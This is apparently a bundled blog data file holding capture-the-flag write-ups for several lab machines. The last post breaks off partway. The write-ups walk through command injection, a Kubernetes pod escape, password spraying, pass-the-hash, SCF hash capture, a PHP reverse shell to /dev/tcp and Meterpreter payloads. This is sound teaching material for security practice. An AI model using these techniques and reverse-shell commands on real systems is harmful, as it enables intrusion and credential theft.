"use strict";(self.webpackChunkmy_blog=self.webpackChunkmy_blog||[]).push([[6663],{6105:e=>{e.exports=JSON.parse('{"archive":{"blogPosts":[{"id":"/SteamCloud","metadata":{"permalink":"/Blog/blog/SteamCloud","editUrl":"https://github.com/danae-pan/Blog/blog/SteamCloud.md","source":"@site/blog/SteamCloud.md","title":"Steam Cloud","description":"Task 1","date":"2025-08-09T00:00:00.000Z","tags":[{"inline":true,"label":"easy","permalink":"/Blog/blog/tags/easy"},{"inline":true,"label":"linux","permalink":"/Blog/blog/tags/linux"}],"readingTime":3.855,"hasTruncateMarker":false,"authors":[],"frontMatter":{"title":"Steam Cloud","date":"2025-08-09T00:00:00.000Z","tags":["easy","linux"]},"unlisted":false,"nextItem":{"title":"Two Million","permalink":"/Blog/blog/TwoMillion"}},"content":"### Task 1\\n\\nWhich containerization framework are the services on TCP ports 2379 and 2380 components of?\\n\\nTargeting those two specific ports with ``nmap -p 2379,2380 <target_ip>`` we see that the services running are the ``etcd-client`` and ``etcd-server`` accordingly. The etcd service is a key-value store used as Kubernetes\' backing store for all cluster data.\\n\\n![alt text](image-s-1.png)\\n\\n### Task 2\\n\\nHow many pods are running on the target system?\\n\\nOne of Kubernetes components is the Kubelet API that is used by the control plane which manages nodes, the worker machines where pods run. Thus, we can use the Kubelet API to list all pods running on nodes. Kubelet API runs on port 10250 that we can validate its state by ``nmap -p 10250 -sS <target_ip>``.\\n\\n![alt text](image-s-2.png)\\n\\nTo find out the number of pods we can then run ``curl -k -X GET https://<target_ip>:10250/pods`` this will return a json response which we can then store in a json file and sort it to have a better overview of the information. Searching this file with for \\"hostIP\\" will return the matches for the IP\'s of the host of pods which essentially is the number of pods.\\n\\n### Task 3 \\n\\nWhich pod in the default namespace allows code execution? Choose from \\"etcd-steamcloud\\", \\"nginx\\", \\"kube-controller-manager-steamcloud\\", and \\"storage-provisioner\\".\\n\\nWe can eliminate the pod by searching on the json file stored previously for \\"namespace: \\"default\\"\\" for the 4 potential pods. The one that matches both conditions is the pod we are looking for.\\n\\n### Task 4\\n\\nIn which directory is the service account access token and certificate stored inside a Kubernetes pod?\\n\\nLooking under the volumeMounts field, we see the directory ``/var/run/secrets/kubernetes.io/serviceaccount/`` mounted with the name ``kube-api-access-zwtvf``. Searching for this name under volumes reveals a projected volume that contains two sources: a serviceAccountToken stored in token, and a configMap providing the CA certificate stored in ca.crt. These files are the pod\u2019s service account token and certificate, used to authenticate and interact with the Kubernetes API server.\\n                        \\n### Task 5\\n\\nWhen creating a Kubernetes Pod, which Volume type can be used to mount a file or directory from the host\'s filesystem onto the Pod? Choose from \\"gcePersistentDisk\\", \\"hostPath\\", \\"secret\\", or \\"emptyDir\\"\\n\\nFrom the same json file, in the pod\u2019s volumeMounts, ``/root`` is mounted from a volume named ``flag``. Looking up ``flag`` under volumes shows it is defined with ``\\"hostPath\\": { \\"path\\": \\"/opt/flag\\" }``, meaning the volume type is hostPath, which mounts files/directories from the host filesystem into the Pod.\\n\\n### Task 6 \\n\\nSubmit the flag located in the user user\'s home directory.\\n\\nWe can use the tool [kubeletctl](https://github.com/cyberark/kubeletctl) to execute into the vulnerable pod by ``./kubeletctl_<binary_for_os>   --server <target_ip>   --port 10250   exec -p nginx -n default -c nginx -- sh -lc`` that runs a shell inside the nginx container and in the nginx pod. In case you built from source, you need to be under the build directory and choose the correct binary file depending on your operating system. We can then navigate to the ``/root`` directory and get the user\'s flag.\\n\\n### Task 7\\n\\nSubmit the flag located in root\'s home directory.\\n\\nIn order to answer this question, we need to escape from the containirised environment to the target machine. In the pod we are in and navigating to the directory ``/var/run/secrets/kubernetes.io/serviceaccount/`` we can obtain both the token and the certificate. These credentials can be used to communicate directly with the Kubernetes API server. With the correct permissions, we can create a pod that mounts the host\u2019s root filesystem (/) inside the container.\\n\\nFirst, create the pod manifest such as:\\n\\n```\\ncat > pod-hostfs.json <<\'JSON\'\\n{\\n  \\"apiVersion\\": \\"v1\\",\\n  \\"kind\\": \\"Pod\\",\\n  \\"metadata\\": { \\"name\\": \\"bb2-escape\\" },\\n  \\"spec\\": {\\n    \\"containers\\": [\\n      {\\n        \\"name\\": \\"bb\\",\\n        \\"image\\": \\"nginx:1.14.2\\",\\n        \\"imagePullPolicy\\": \\"Never\\",\\n        \\"command\\": [\\"sh\\",\\"-lc\\",\\"sleep 3600000\\"],\\n        \\"volumeMounts\\": [\\n          { \\"name\\": \\"host\\", \\"mountPath\\": \\"/node-host\\" }\\n        ]\\n      }\\n    ],\\n    \\"volumes\\": [\\n      { \\"name\\": \\"host\\", \\"hostPath\\": { \\"path\\": \\"/\\", \\"type\\": \\"Directory\\" } }\\n    ]\\n  }\\n}\\nJSON\\n```\\n\\nThis pod mounts the host\'s ``/`` directory at ``/node-host`` inside the container. Then, after storing the ``TOKEN`` and ``APISRV`` as environmental variables and the certificate in a file called \\"ca.crt\\", deploy the pod using the API server:\\n\\n\\n```\\ncurl --cacert ca.crt -H \\"Authorization: Bearer $TOKEN\\" \\\\\\n     -H \\"Content-Type: application/json\\" \\\\\\n     -X POST \\"$APISRV/api/v1/namespaces/default/pods\\" \\\\\\n     -d @pod-hostfs.json\\n```\\n\\nAfter executing into the pod using the following command:\\n\\n```\\n./kubeletctl_<binary_for_os> \\\\\\n  --server <target_ip> --port 10250 \\\\\\n  exec -p bb2-escape -n default -c bb -- sh -lc \'id && mount | head && ls -la /node-host\'\\n```\\n\\nthe ``/node-host`` will be the host\'s root filesystem. Thus, to get the root flag, navigate to the ``node-host/root`` directory and grab it by running ``cat root.txt``."},{"id":"/TwoMillion","metadata":{"permalink":"/Blog/blog/TwoMillion","editUrl":"https://github.com/danae-pan/Blog/blog/TwoMillion.md","source":"@site/blog/TwoMillion.md","title":"Two Million","description":"Task 1","date":"2025-08-02T00:00:00.000Z","tags":[{"inline":true,"label":"easy","permalink":"/Blog/blog/tags/easy"},{"inline":true,"label":"linux","permalink":"/Blog/blog/tags/linux"}],"readingTime":5.705,"hasTruncateMarker":true,"authors":[],"frontMatter":{"title":"Two Million","date":"2025-08-02T00:00:00.000Z","tags":["easy","linux"]},"unlisted":false,"prevItem":{"title":"Steam Cloud","permalink":"/Blog/blog/SteamCloud"},"nextItem":{"title":"Cicada","permalink":"/Blog/blog/Cicada"}},"content":"### Task 1\\n\\nHow many TCP ports are open?\\n\\nRunning ``nmap -sS <target_ip>`` we see two ports open on the target system. \\n\\n![alt text](image-t-1.png)\\n\\n### Task 2\\n\\nWhat is the name of the JavaScript file loaded by the /invite page that has to do with invite codes?\\n\\nNavigating to the target IP on the browser we see that the server is not found. After adding the target IP on the host file using the command ``sudo vim /etc/hosts`` with the domain name being ``2million.htb`` we can refresh the page and navigate to the /invite page. There, we see a sign-up/login form. \\n\\n![alt text](image-t-2.png)\\n\\nViewing the page source and searching for any Javascript file, we locate the following, having the name ``inviteapi.min.js``:\\n\\n![alt text](image-t-3.png)\\n\\n### Task 3\\n\\nWhat JavaScript function on the invite page returns the first hint about how to get an invite code? Don\'t include () in the answer.\\n\\nOpening the previous file, we locate the function ``makeInviteCode`` that is the Javascript function returning the first hint.\\n\\n### Task 4\\n\\nThe endpoint in makeInviteCode returns encrypted data. That message provides another endpoint to query. That endpoint returns a code value that is encoded with what very common binary to text encoding format. What is the name of that encoding?\\n\\nFirst, opening the console on the developer tools, we call the function by ``makeInviteCode`` and observe the result:\\n\\n![alt text](image-t-4.png) \\n\\nWe see that the data is encoded with ROT13, so we can decode the value of the field ``data`` using any ROT13 decoder and we get the message \\"In order to generate the invite code, make a POST request to /api/v1/invite/generate\\". So, we can use ``fetch`` in the browser console to query this endpoint by:\\n\\n```\\nfetch(\'/api/v1/invite/generate\', {\\n  method: \'POST\',\\n  headers: { \'Content-Type\': \'application/json\' }\\n})\\n  .then(res => res.json())\\n  .then(data => console.log(data));\\n```\\n\\nAs a response, we see the code that is encoded using Base64.\\n\\n![alt text](image-t-5.png)\\n\\n### Task 5\\n\\nWhat is the path to the endpoint the page uses when a user clicks on \\"Connection Pack\\"?\\n\\nFirst, we decode the code from the previous task and use it to sign up and register for an account. We then login and look for the \\"Connection Pack\\". We find it under the \\"Access\\" page, we open the tools on the Network tab and clicking the button. On the Headers tab of the request we see the API endpoint where the GET function sends the request.\\n\\n### Task 6\\n\\nHow many API endpoints are there under /api/v1/admin?\\n\\nBy navigating to the endpoint ``/api/v1`` we can see a list of endpoints including admin.\\n\\n![alt text](image-t-6.png)\\n\\n### Task 7 \\n\\nWhat API endpoint can change a user account to an admin account?\\n\\nInspecting the result from the previous task we see that he desired endpoint is ``/api/v1/admin/settings/update``.\\n\\n\x3c!--truncate--\x3e \\n\\n### Task 8\\n\\nWhat API endpoint has a command injection vulnerability in it?\\n\\nWe can try to send a PUT request to the endpoint from the previous task using Repeater. We need to also adjust the content type to be Content-Type: application/json on the request. From the response we see that there is a missing parameter for the email field.\\n\\n![alt text](image-t-8.png)\\n\\nAdding the parameter email on the body of the request and repeating we see that there is also the is_admin parameter missing. We can try adding this as well with the value being true to see whether we are able to change the privileges for the registered user. Sending this request we get a status code of 200 meaning a successful request. \\n\\n![alt text](image-t-9.png)\\n\\nWe can also use the endpoint ``/api/v1/admin/auth`` to check if the user is admin which returns a positive response. Since we are now an admin user, we can also try the last API endpoint with the method POST ``/api/v1/admin/vpn/generate``. For this request to succeed, we need also to add the Content-Type to be application/json as before as well as the username with its value as body parameter. To see if this is the endpoint that has the command injection vulnerability, we can try injecting ``;id #`` after the value of the username field on the body. \\n\\n![alt text](image-t-10.png)\\n\\nThe request goes through giving us a 200 OK status code and returning back the user\'s identity information which means the command injection is successful. \\n\\n### Task 9\\n\\nWhat file is commonly used in PHP applications to store environment variable values?\\n\\nFurther using the command injection, we can try listing the contents of the diretory by changing the ``id`` command to ``ls``. On the response, we see a list of files and folders.\\n\\n![alt text](image-t-11.png)\\n\\nFrom those, we can use ``cat index.php`` command and see the contents of this file in the response. \\n\\n![alt text](image-t-12.png)\\n\\nFrom the response it seems that those values are being read from a ``.env`` file. Seeing the contents of the file with the command ``cat .env`` we get the environmental variables for the database as a response. \\n\\n### Task 10\\n\\nSubmit the flag located in the admin user\'s home directory.\\n\\nUsing the admin\'s credentials found previously, we can now directly ssh to the server to obtain the flag by ``ssh admin@2million.htb`` and providing the admin\'s password. Then, finding the flag is just as easy as running ``cat user.txt``.\\n\\n### Task 11\\n\\nWhat is the email address of the sender of the email sent to admin?\\n\\nIn linux, local emails are usually stored in ``/var/mail`` directory. Navigating there and opening the file with the name \\"admin\\" we find the sender.\\n\\n### Task 12\\n\\nWhat is the 2023 CVE ID for a vulnerability in that allows an attacker to move files in the Overlay file system while maintaining metadata like the owner and SetUID bits?\\n\\nLooking up for vulnerabilities of the Overlay file system in the [CVE database](https://www.cve.org/), we find the CVE ID.\\n\\n### Task 13\\n\\nSubmit the flag located in root\'s home directory.\\n\\nLooking up for a public exploit for this vulnerability we come up with a [github repository](https://github.com/sxlmnwb/CVE-2023-0386). In order to use this exploit on the target machine where we gained the admin privilege, we have first to clone it on the host machine and then open a connection by spanning a python server on the directory where the repository file is. Before attempting transfer, we need to compress the entire foler into a single file using the command ``tar czf CVE-2023-0386.tar.gz CVE-2023-0386/``. Running ``python3 -m http.server 8080`` opens a connection on port 8080 so we can now communicate from the target server to transfer the file using the command ``wget http://<host_ip>:8080/CVE-2023-038.tar.gz``. Then, after extracting the archive by ``tar xzf CVE-2023-0386.tar.gz`` we can use the repository\'s README as guide to compile by running ``make``. On the same terminal we then run ``./fuse ./ovlcap/lower ./gc`` and om a second terminal ``./exp``. We now have root access and we can navigate to root\'s directory, run ``cat root.txt`` and get the flag."},{"id":"/Cicada","metadata":{"permalink":"/Blog/blog/Cicada","editUrl":"https://github.com/danae-pan/Blog/blog/Cicada.md","source":"@site/blog/Cicada.md","title":"Cicada","description":"Task 1","date":"2025-06-15T00:00:00.000Z","tags":[{"inline":true,"label":"easy","permalink":"/Blog/blog/tags/easy"},{"inline":true,"label":"windows","permalink":"/Blog/blog/tags/windows"}],"readingTime":3.58,"hasTruncateMarker":true,"authors":[],"frontMatter":{"title":"Cicada","date":"2025-06-15T00:00:00.000Z","tags":["easy","windows"]},"unlisted":false,"prevItem":{"title":"Two Million","permalink":"/Blog/blog/TwoMillion"},"nextItem":{"title":"Board Light","permalink":"/Blog/blog/BoardLight"}},"content":"### Task 1\\n\\nWhat is the name of the non-default SMB share that is readable with guest access on Cicada?\\n\\nRunning ``smbclient -N -L //<target_ip>`` to connect to the share server without providing a password and list the shares we see two non-default shares named ``DEV`` and ``HR``. \\n\\n![alt text](image-ci-1.png)\\n\\nNext, to see which one is readable as a guest, we will try to connect to those specific shares. Running ``smbclient -N //<target_ip>/<share_name>`` we see the one we have access to read is the ``HR`` share.\\n\\n![alt text](image-ci-2.png)\\n\\n### Task 2\\n\\nWhat is the name of the file found in the HR share? \\n\\nSeen in the previous task, from listing the contents of the HR share, the file name is \\"Notice from HR.txt\\".\\n\\n### Task 3\\n\\nWhich user account is still using the company default password?\\n\\nTo see the contents of the file found, we can transfer it to the host by running ``get \\"Notice from HR``.txt\\". Opening it, we see a welcoming message to a new hire with the default password but it does not give a username\\n\\n![alt text](image-ci-3.png)\\n\\nThen, we can try to enumerate domain users on the target IP and save them to a file by running ``lookupsid.py anonymous@<target_ip> > lookupsid_output.txt``. Then, we save the usernames cleanly we run ``grep \'(SidTypeUser)\' lookupsid_output.txt | awk -F \'\\\\\\\\\' \'{print $2}\' | cut -d\' \' -f1 > users.txt``.  Finally using the password found in the file, we can perform a password spray attack by running ``netexec smb <target_ip> -u users.txt -p \'Cicada$M6Corpb*@Lp#nZp!8\'`` and find the username to be michael.wrightson.\\n\\n![alt text](image-ci-5.png)\\n### Task 4\\n\\nWhich user has left their password in Active Directory metadata?\\n\\nWe dump the AD metadata using ``ldapdomaindump -u cicada.htb\\\\\\\\michael.wrightson -p \'Cicada$M6Corpb*@Lp#nZp!8\' <target_ip>``. We then try the command ``grep -iE \'pass|key|desc|comment\' domain_users.json`` to look for password in the file matching any lines that contain the mentioned keywords. \\n\\n![alt text](image-ci-6.png)\\n\\nAfter finding the password we can try to connect with it using the users.txt file from the previous task as ``netexec smb <target_ip> -u users.txt -p \'aRt$Lp#7t*VQ!3\'``.\\n\\n![alt text](image-ci-7.png)\\n\\n\x3c!--truncate--\x3e \\n\\n### Task 5\\n\\nWhat is the name of the PowerShell script located in the DEV share?\\n\\nConnecting to the DEV share with the credential found in the previous task by running ``smbclient //<target_ip>/DEV -U \'cicada.htb\\\\\\\\david.orelious%aRt$Lp#7t*VQ!3\'`` we find the Powershell script after listing the contents.\\n\\n![alt text](image-ci-8.png)\\n\\n### Task 6\\n\\nWhat is the emily.oscars user\'s password?\\n\\nWe get the file in our host by running ``get Backup_script.ps1`` and after exiting smb we open the file and locate the user\'s password.\\n\\n![alt text](image-ci-9.png)\\n\\n### Task 7\\n\\nSubmit the flag located in the emily.oscars user\'s home directory.\\n\\nWe will try to connect to the default share with the credential found for emily.oscars by running ``smbclient //<target_ip>/C$ -U \'cicada.htb\\\\\\\\emily.oscars%Q!3@Lp#M6b*7t*Vt\'``. We then navigate to here home directory with the relative path ``\\\\Users\\\\emily.oscars.CICADA\\\\DESKTOP\\\\`` and run ``get user.txt`` to get the user flag and open it with ``cat`` on the host machine.\\n\\n### Task 8\\n\\nWhat dangerous privilege does the emily.oscar user have associated with their account?\\n\\nFirst we connect with the credentials for the emily user ``evil-winrm -i <host_ip> -u emily.oscars -p \'Q!3@Lp#M6b*7t*Vt\'``. Then, we run ``whoami /priv`` to display the privieges that the user holds on the system and we find that the ``SeBackupPrivilege`` is enabled for the current user which permits reading any file. \\n\\n![alt text](image-ci-10.png)\\n\\n### Task 9 \\n\\nWhat is the Administrator user\'s NTLM hash?\\n\\nKeeping the evil-winrm session active, we will save the Windows regitstry hives by running the following: \\n\\n```\\nreg save HKLM\\\\SAM C:\\\\Users\\\\emily.oscars\\\\Documents\\\\sam.save\\nreg save HKLM\\\\SYSTEM C:\\\\Users\\\\emily.oscars\\\\Documents\\\\system.save\\n``` \\n\\nWe download both files to the local machine by :\\n```\\ndownload sam.save\\ndownload system.save\\n```\\n\\nThen, to extract the NTLM hashes we run ``secretsdump.py -system system.save -sam sam.save LOCAL``. This command decrypts the SAM file using the SYSTEM hive and displays local user account hashes. The NTLM hash is the third colon-separated field in the output.\\n\\n![alt text](image-ci-11.png)\\n\\n### Task 10\\n\\nSubmit the flag located on the Administrator user\'s Desktop.\\n\\nWe can now perrform a Pass-The-Hash attack to impersonate the Administrator using the hash we found in the previous task. Since evil-winfrm supports PtH directly we run ``evil-winrm -i <target_ip> -u Administrator -H 2b87e7c93a3e8a0ea4a581937016f341`` and running ``whoami`` we validate we are \\"cicada\\\\administrator\\". Navigating to the Desktop we get the flag by running ``cat root.txt``."},{"id":"/BoardLight","metadata":{"permalink":"/Blog/blog/BoardLight","editUrl":"https://github.com/danae-pan/Blog/blog/BoardLight.md","source":"@site/blog/BoardLight.md","title":"Board Light","description":"Task 1","date":"2025-06-05T00:00:00.000Z","tags":[{"inline":true,"label":"easy","permalink":"/Blog/blog/tags/easy"},{"inline":true,"label":"linux","permalink":"/Blog/blog/tags/linux"}],"readingTime":3.775,"hasTruncateMarker":true,"authors":[],"frontMatter":{"title":"Board Light","date":"2025-06-05T00:00:00.000Z","tags":["easy","linux"]},"unlisted":false,"prevItem":{"title":"Cicada","permalink":"/Blog/blog/Cicada"},"nextItem":{"title":"Driver","permalink":"/Blog/blog/Driver"}},"content":"### Task 1 \\n\\nHow many TCP ports are listening on BoardLight?\\n\\nBy running ``sudo nmap -sS <target_ip>`` we scan for all TCP ports on the target machine.\\n\\n![alt text](image-b.png)\\n\\n### Task 2\\n\\nWhat is the domain name used by the box?\\n\\nNavigating to the web page by typing the IP address on a browser, we see at the end of the page that the contact email is ``info@board.htb``. At the end of the page, we also see the copyright message \\"2020 All Rights Reserved By Board.htb\\" using the same  domain. Those are strong indications of the domain used by the box.\\n\\n### Task 3\\n\\nWhat is the name of the application running on a virtual host of board.htb?\\n\\nFor answering this task, we can use the ``gobuster`` tool to brute-force subdomains via virtual host fuzzing. After adding the target IP address - domain pair on the /etc/hosts file, we run ``gobuster vhost -u http://board.htb -w /usr/share/wordlists/seclists/Discovery/DNS/subdomains-top1million-5000.txt``. \\n\\n![alt text](image-b-1.png)\\n\\nWe find the ``crm.board.htb`` domain and we add this with the target IP address to the /etc/hosts file as well. After, we navigate to the domain name on the web browser and find the application.\\n\\n![alt text](image-b-2.png)\\n\\n### Task 4\\n\\nWhat version of Dolibarr is running on BoardLight?\\n\\nOn the top of the web page, the version for the application shows to be 17.0.0.\\n\\n### Task 5\\n\\nWhat is the default password for the admin user on Dolibarr?\\n\\nSince we are presented with a login page we can try the password ``admin`` for the user ``admin`` which works successfully getting as to the admin\'s page.\\n\\n### Task 6\\n\\nWhat is the 2023 CVE ID for an authenticated vulnerability that can lead to remote code execution in this version of Dolibarr?\\n\\nSearching for the version of Dolibarr on the [NIST vulnerability database](https://nvd.nist.gov/vuln/detail/CVE-2023-30253), we find the ID to be ``CVE-2023-30253``.\\n\\n\x3c!--truncate--\x3e \\n\\n### Task 7\\n\\nWhat user is the Dolibarr application running as on BoardLight?\\n\\nWe first navigate to the \\"Websites\\" tab on the admin page and we add a Website. On the website we add a webpage by using an empty page as an example. \\n\\n![alt text](image-b-3.png)\\n\\nAfter creating the empty page, we edit the HTML source by adding php code, changint the format to uppercase to bypass the filtering.\\n\\n![alt text](image-b-4.png)\\n\\nThis results to succesfully executing the inserted php code. Next, we set up a listener ``nc -lnvp 4444`` and add a reverse shell code on the HTML source such ``<?PHP exec(\\"/bin/bash -c \'bash -i > /dev/tcp/<host_ip>/4444 0>&1\'\\");?>``. This gives us a connection.\\n\\n![alt text](image-b-5.png)\\n\\n### Task 8 \\n\\nWhat is the full path of the file that contains the Dolibarr database connection information?\\n\\nSearching online about Dolibarr configuration files we find that it is usually under ``/htdocs/conf/conf.php``. Indeed, navigating to ``/var/www/html/crm.board.htb/htdocs/conf`` and opening the ``conf.php`` file we can see the database configuration.\\n\\n![alt text](image-b-6.png)\\n\\n### Task 9\\n\\nSumbit the flag located in the larissa user\'s home directory.\\n\\nNavigating to the ``/home`` directory we see that as the user we currently are we cannot have access to the directory larissa.\\n\\n![alt text](image-b-7.png)\\n\\nWhat we will now do, is using the database credentials we previously found in the configuration file to switch to the larissa user. We run:\\n\\n```\\nsu larissa\\nserverfun2$2023!!\\n```\\n\\nAnd we actually managed to gain access.\\n\\n![alt text](image-b-8.png)\\n\\nWe go on by navigating to larisa\'s home directory and get the user flag by using ``cat user.txt``. \\n\\n### Task 10 \\n\\nWhat is the name of the desktop environment installed on Boardlight?\\n\\n\\nTo find the desktop environment we can run ``ls /usr/share/xsessions`` since this directory contains the .desktop files that define the graphical session for display managers.\\n\\n### Task 11 \\n\\nWhat version of Enlightenment is installed on BoardLight?\\n\\nTo see the version, we can open the file we found in the previous task.\\n\\n### Task 12\\n\\nWhat is the 2022 CVE ID for a vulnerability in Enlightenment versions before 0.25.4 that allows for privilege escalation?\\n\\nAfter searching fot the vulnerability on the CVE database, we find the CVE ID to be [CVE-2022-37706](https://www.cve.org/CVERecord?id=CVE-2022-37706).\\n\\n### Task 13\\n\\nSubmit the flag located in the root user\'s home directory.\\n\\nAfter finding a public exploit, we open a web server on the host and on the directory that exploit file is saved with ``pyhthon3 -m http.server 8080``. Then on the target we use ``wget http://<host_ip>:8080/exploit.sh`` to get the file. After getting the file we run ``chmod +x exploit.sh`` to make it executable. Running it, we gain root privileges.\\n\\n![alt text](image-b-9.png)\\n\\nNavigating to the root directory we get the root flag by ``cat root.txt``."},{"id":"/Driver","metadata":{"permalink":"/Blog/blog/Driver","editUrl":"https://github.com/danae-pan/Blog/blog/Driver.md","source":"@site/blog/Driver.md","title":"Driver","description":"Task 1","date":"2025-05-25T00:00:00.000Z","tags":[{"inline":true,"label":"easy","permalink":"/Blog/blog/tags/easy"},{"inline":true,"label":"windows","permalink":"/Blog/blog/tags/windows"}],"readingTime":5.235,"hasTruncateMarker":true,"authors":[],"frontMatter":{"title":"Driver","date":"2025-05-25T00:00:00.000Z","tags":["easy","windows"]},"unlisted":false,"prevItem":{"title":"Board Light","permalink":"/Blog/blog/BoardLight"},"nextItem":{"title":"Precious","permalink":"/Blog/blog/Precious"}},"content":"### Task 1\\n\\nWe\'re prompted for log on credentials when accessing the target over HTTP. What username is disclosed when looking at the HTTP response headers?\\n\\nWe use curl with the option for fetching headers only ``curl -I <target_ip>`` and see on the ``WWW-Authenticate`` the username admin.\\n\\n![alt text](image-dr-1.png)\\n\\n### Task 2\\n\\nWeak passwords are all too common and this target is no exception. What is the password for this target\'s login?\\n\\nBefore using any automated tools, we try with the default, common password ``admin`` and it gets us in. On the main page we are presented with a MFP Firmware Update Center.\\n\\n![alt text](image-dr-2.png)\\n\\n### Task 3\\n\\nThere are several kinds of files that are commonly dropped into a file share to target other users who may browse to the share. If the user browses to the share, their host will try to authenticate to the attacker. What is the file extension that can be uploaded here to trigger that connection?\\n\\nThe file that is asked here, has the extension ``.scf`` which stands for Shell Command File. This file can be placed on a writable SMB share or web-based file upload to force outbound authentication requests. For more detailed information visit [MITRE ATT&CK](https://attack.mitre.org/techniques/T1187/)\\n\\n### Task 4\\n\\nWe\'ve intercepted an Net-NTLMv2 hash with Responder. What is the mode in Hashcat required to crack this hash format?\\n\\nWhen Responder intercepts a Net-NTLMv2 hash, the format looks like:\\n\\n```\\nUSERNAME::DOMAIN:ServerChallenge:NTProofStr:Blob\\n```\\n\\nThis structure corresponds exactly to the format supported by Hashcat mode 5600 which is backed up by the Hashcat official documentation [Hashcat Generic hash types](https://hashcat.net/wiki/doku.php?id=example_hashes)\\n\\n### Task 5\\n\\nWhat is the tony user\'s password?\\n\\nTo solve this task, we will start responder ``sudo responder -I tun0`` and then upload a scf file to the file share via the printer upload form that would trigger an SMB authentication. We create a file as follows:\\n\\n```\\n[Shell]\\nCommand=2\\nIconFile=\\\\\\\\<host_ip>\\\\share\\\\icon.ico\\n[Taskbar]\\nCommand=ToggleDesktop\\n```\\n\\nThis works, and the Net-NTLMv2 hash is captured by Responder because this upload is reviewed manually and thus opened as the web page explains.\\n\\n![alt text](image-dr-3.png)\\n\\nAs mentioned in the previous task, the full hash string can be cracked using Hashcat mode 5600. We create a file called tony_hash with this hash, we run ``hashcat -m 5600 -a 0 tony_hash.txt /usr/share/wordlists/rockyou.txt`` and the password is cracked.\\n\\n### Task 6\\n\\nSubmit the flag located on the tony user\'s desktop.\\n\\nWe will first list the shared folders on the target Microsoft-DS by running ``smbclient -L //<target_ip> -U \'tony\'`` using the user tony\'s password we found in the previous task. \\n\\n![alt text](image-dr-4.png)\\n\\nThen we can try connecting directly to the ``C$`` default share by running ``smbclient //<target_ip>/C$ -U \'tony\'`` which gave us access denied. We then try ``crackmapexec smb <target_ip> -u tony -p \'liltony\' --shares`` \\n\\n![alt text](image-dr-5.png)\\n\\nThis validates that the user does not have access but we see that Windows 10 Enterprise is used which by default has WinRM installed and often enabled.\\n\\n``crackmapexec winrm <target_ip> -u tony -p liltony``\\n\\n![alt text](image-dr-16.png)\\n\\nSince the service is enabled we can use ``evil-winrm -i <target_ip> -u tony -p liltony``. We have access and navigating to tony\'s Desktop we get the flag by ``cat user.txt``.\\n\\n\x3c!--truncate--\x3e \\n\\n### Task 7\\n\\nWhat is the filename that stores the command history for PowerShell for tony?\\n\\nBased on [Microsoft Documentation](https://learn.microsoft.com/en-us/powershell/module/psreadline/get-psreadlineoption?view=powershell-7.5) the location of the command history can be revealed from the property ``HistorySavePath`` after running ``Get-PSReadlineOption``. Trying this did not work on the WinRM because it is not a fully interactive terminal. We try to view the default location to see if the history is stored there by ``type \\"$env:APPDATA\\\\Microsoft\\\\Windows\\\\PowerShell\\\\PSReadLine\\\\ConsoleHost_history.txt\\"`` and it works, thus, the filename is ``ConsoleHost_history.txt``.\\n\\n### Task 8 \\n\\nLooking at the Powershell history we can see some actions being performed with a specific printer type. Research of this should show that it\'s exploitable for privilege escalation and a module is available for the Metasploit framework. What is the module name?\\n\\nLooking through the output of the command history we see the driver name and name for the printer. Looking up on the CVE database online, we find the CVE to be ``CVE-2019-19363``. We spin Metasploit by ``msfonsole`` and search for the CVE ID by ``search cve:2019-19363`` finding the module name. \\n\\n![alt text](image-dr-6.png)\\n\\n![alt text](image-dr-7.png)\\n\\n### Task 9 \\n\\nInitial attempts to exploit this vulnerability may fail under specific logon types such as non-interactive, but in this scenario we can switch to an interactive logon. What command can be used in Metasploit to switch to an interactive logon process?\\n\\nFirst, we generate a Meterpreter Payload ``msfvenom -p windows/shell_reverse_tcp LHOST=10.10.14.95 LPORT=4444 -f exe > shell.exe``. Then, run ``msfconsole`` to spin up a metasploit listener and start the module previously found by:\\n\\n```\\nuse exploit/multi/handler\\nset payload windows/x64/meterpreter/reverse_tcp\\nset LHOST <host_ip>\\nset LPORT 4444\\nrun\\n```\\n\\nThen, we upload the paylod inside the Evil-WinRM session ``upload shell.exe``and execute it ``.\\\\shell.exe``. Going back to the Metasploit we get an interactive shell back.\\n\\n![alt text](image-dr-9.png)\\n\\nWe need to ``backrgound`` that session and then start the module to exploit the vulnerable driver with the known CVE we found in the previous task. \\n\\n```\\nuse exploit/windows/local/ricoh_driver_privesc\\nset session <session_id>\\nset LHOST <host_ip>\\nset payload windows/x64/meterpreter/reverse_tcp\\nrun\\n```\\n\\nEven though it seems that is working, the terminal hungs. The Ricoh driver exploit requires an interactive logon session with GUI access. So we need to use the ``migrate`` command to migrate the Meterpreter session into a GUI-based process. Bringing back the metasploit session by running ``sessions -i <session_id>`` and listing the processes ``ps`` we see that a good candidate is the ``explorer.exe``. We migrate by running ``migrate <explorer_id>``, then run the exploit again and it works. To validate we run ``getuid`` and we see that we have SYSTEM rights. \\n\\n![alt text](image-dr-10.png)\\n\\n### Task 10 \\n\\nIn addtion to the \'RICOH PCL6 UniversalDriver V4.23\' vulnerabiltiy, this target is also vulnerable to CVE-2021-1675 aka PrintNightmare. Is it possible to elevate to SYSTEM privileges with this CVE?\\n\\nLooking up this [CVE on the CVE database](https://www.cvedetails.com/cve/CVE-2021-1675/), it is confirmed that there is a Metasploit module that if used, results in remote code execution as NT \\\\AUTHORITY\\\\SYSTEM.\\n\\n### Task 11\\n\\nSubmit the flag located on the administrator\'s desktop.\\n\\nFrom Task 9, we already have SYSTEM privileges. Navigating to the administrator\'s desktop we get the root flag by running ``cat root.txt``."},{"id":"/Precious","metadata":{"permalink":"/Blog/blog/Precious","editUrl":"https://github.com/danae-pan/Blog/blog/Precious.md","source":"@site/blog/Precious.md","title":"Precious","description":"Task 1","date":"2025-05-24T00:00:00.000Z","tags":[],"readingTime":3.59,"hasTruncateMarker":true,"authors":[],"frontMatter":{"title":"Precious","date":"2025-05-24T00:00:00.000Z"},"unlisted":false,"prevItem":{"title":"Driver","permalink":"/Blog/blog/Driver"},"nextItem":{"title":"Writeup","permalink":"/Blog/blog/Writeup"}},"content":"### Task 1\\n\\nNginx is running with what additional software designed to serve web applications?\\n\\nNavigating to the target IP address we are being redirected to the domain ``precious.htb``. We then add it to the hosts file ``vim /etc/hosts`` and reload the page.\\n\\n![alt text](image-pr-14.png)\\n\\nAfter reloading the page, we see that the website\'s usage is converting web page to pdf.\\n\\n![alt text](image-pr-15.png)\\n\\nWe then run ``whatweb <target_url> -v`` and find that additional to nginx web server, the software running is Phusion Passenger.\\n\\n![alt text](image-pr-16.png)\\n\\n### Task 2 \\n\\nWhich HTTP response header reveals the underlying scripting Language of the web application?\\n\\nFrom the same response of ``whatweb``, we see the HTTP response header that specifies the scripting 